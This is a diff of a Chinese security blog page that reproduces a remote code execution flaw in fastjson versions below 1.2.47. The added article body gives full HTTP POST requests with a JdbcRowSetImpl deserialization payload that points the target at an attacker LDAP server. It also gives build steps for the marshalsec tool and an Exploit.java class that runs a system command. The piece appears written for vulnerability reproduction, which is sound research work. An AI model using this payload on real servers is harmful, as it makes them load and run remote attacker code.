@@ -10,19 +10,25 @@
   
   
   
-  <meta name="description" content="author：testOx01 具体环境War包部署在tomcattomcat版本java版本 post数据包 POST /fastjson/ HTTP/1.1Host: x.x.x.x:8080Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X">
+  <meta name="description" content="author：testOx01 具体环境War包部署在tomcat,war包使用fastjson解析库tomcat版本java版本 0x02 尝试是否可以接受请求（也可以没有这一步）先尝试是否可以收到ldap请求post数据包如下： POST /fastjson/ HTTP/1.1Host: x.x.x.x:8080Cache-Control: max-age=0Upgrade-Insecure-">
 <meta property="og:type" content="article">
 <meta property="og:title" content="fastjson&lt;1.2.47 RCE 漏洞复现">
 <meta property="og:url" content="http://yoursite.com/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/index.html">
 <meta property="og:site_name" content="beautiful test">
-<meta property="og:description" content="author：testOx01 具体环境War包部署在tomcattomcat版本java版本 post数据包 POST /fastjson/ HTTP/1.1Host: x.x.x.x:8080Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X">
+<meta property="og:description" content="author：testOx01 具体环境War包部署在tomcat,war包使用fastjson解析库tomcat版本java版本 0x02 尝试是否可以接受请求（也可以没有这一步）先尝试是否可以收到ldap请求post数据包如下： POST /fastjson/ HTTP/1.1Host: x.x.x.x:8080Cache-Control: max-age=0Upgrade-Insecure-">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/08/27/2K7oDWtaXfJQLRZ.png">
 <meta property="og:image" content="https://i.loli.net/2019/08/27/sEuCnxq9ywDjoXc.png">
-<meta property="og:updated_time" content="2019-08-28T07:41:57.505Z">
+<meta property="og:image" content="https://i.loli.net/2019/08/28/qSNUrFeazAE9D1O.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/28/nXfgcxB52t1zWGs.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/28/zCHtumkTcDaywFr.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/28/jPMmU4wk2dvY6VS.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/28/ul5kdwaSCtj8Ghr.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/28/rlUNhKzpy72SsQa.png">
+<meta property="og:updated_time" content="2019-08-28T08:15:11.225Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="fastjson&lt;1.2.47 RCE 漏洞复现">
-<meta name="twitter:description" content="author：testOx01 具体环境War包部署在tomcattomcat版本java版本 post数据包 POST /fastjson/ HTTP/1.1Host: x.x.x.x:8080Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X">
+<meta name="twitter:description" content="author：testOx01 具体环境War包部署在tomcat,war包使用fastjson解析库tomcat版本java版本 0x02 尝试是否可以接受请求（也可以没有这一步）先尝试是否可以收到ldap请求post数据包如下： POST /fastjson/ HTTP/1.1Host: x.x.x.x:8080Cache-Control: max-age=0Upgrade-Insecure-">
 <meta name="twitter:image" content="https://i.loli.net/2019/08/27/2K7oDWtaXfJQLRZ.png">
   
     <link rel="alternate" href="/atom.xml" title="beautiful test" type="application/atom+xml">
@@ -97,10 +103,18 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <p>author：test<br><strong>Ox01 具体环境</strong><br>War包部署在tomcat<br>tomcat版本<br><img src="https://i.loli.net/2019/08/27/2K7oDWtaXfJQLRZ.png" alt="5D75FE00-9F51-4699-B80C-E0C55CC156B8.png"><br>java版本<br><img src="https://i.loli.net/2019/08/27/sEuCnxq9ywDjoXc.png" alt="CA5DF7C1-FE3A-4E6B-8CE4-97A383030DD4.png"></p>
-<p>post数据包</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: x.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://x.x.x.x:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+        <p>author：test<br><strong>Ox01 具体环境</strong><br>War包部署在tomcat,war包使用fastjson解析库<br>tomcat版本<br><img src="https://i.loli.net/2019/08/27/2K7oDWtaXfJQLRZ.png" alt="图"><br>java版本<br><img src="https://i.loli.net/2019/08/27/sEuCnxq9ywDjoXc.png" alt="图"></p>
+<p><strong>0x02 尝试是否可以接受请求（也可以没有这一步）</strong><br>先尝试是否可以收到ldap请求<br>post数据包如下：</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: x.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://x.x.x.x:8080/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>
 
+<p>发送数据报：<br><img src="https://i.loli.net/2019/08/28/qSNUrFeazAE9D1O.png" alt="D518D79A-05ED-4BCF-9B43-1F208FAEB7B7.png"><br>服务端接口请求：<br><img src="https://i.loli.net/2019/08/28/nXfgcxB52t1zWGs.png" alt="图"></p>
+<p><strong>Ox03 构造数据包以及工具</strong><br>1 用到的工具： <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a><br>2 使用maven打包，具体为cd到目录然后 mvn clean package -DskipTests<br>3 构造数据包<br>post数据包如下：</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: 10.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://10.x.x.x:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>4 构造的恶意java类，需要javac编译成class文件，存放于http服务器，ldap服务指向于http服务<br>代码命名为：Exploit.java</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime ().exec ( &quot;calc&quot; );</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Exploit e=new Exploit ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>编译此java文件<br><img src="https://i.loli.net/2019/08/28/zCHtumkTcDaywFr.png" alt="图"><br><strong>0x04 启动服务，验证是否 可以执行命令</strong><br>启动各类服务<br><img src="https://i.loli.net/2019/08/28/jPMmU4wk2dvY6VS.png" alt="36602945-99DE-4243-87EB-E23C58457AF8.png"><br>发送数据包<br><img src="https://i.loli.net/2019/08/28/ul5kdwaSCtj8Ghr.png" alt="test.png"><br>执行成功<br><img src="https://i.loli.net/2019/08/28/rlUNhKzpy72SsQa.png" alt="9C7899A6-2E6A-42CB-94E0-D9F82C37416A.png"></p>
 
       
     </div>
@@ -112,20 +126,6 @@
   </div>
   
     
-<nav id="article-nav">
-  <div class="article-nav-block">
-    
-  </div>
-  <div class="article-nav-block">
-    
-      <a href="/2019/08/22/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-        <div class="article-nav-title">Hello World</div>
-        <strong class="article-nav-caption"></strong>
-      </a>
-    
-  </div>
-</nav>
-
     
 <div id="gitmentContainer"></div>
 <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
@@ -189,10 +189,6 @@ gitment.render('gitmentContainer')
         
           <li>
             <a href="/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/">fastjson&lt;1.2.47 RCE 漏洞复现</a>
-          </li>
-        
-          <li>
-            <a href="/2019/08/22/hello-world/">Hello World</a>
           </li>
         
       </ul>
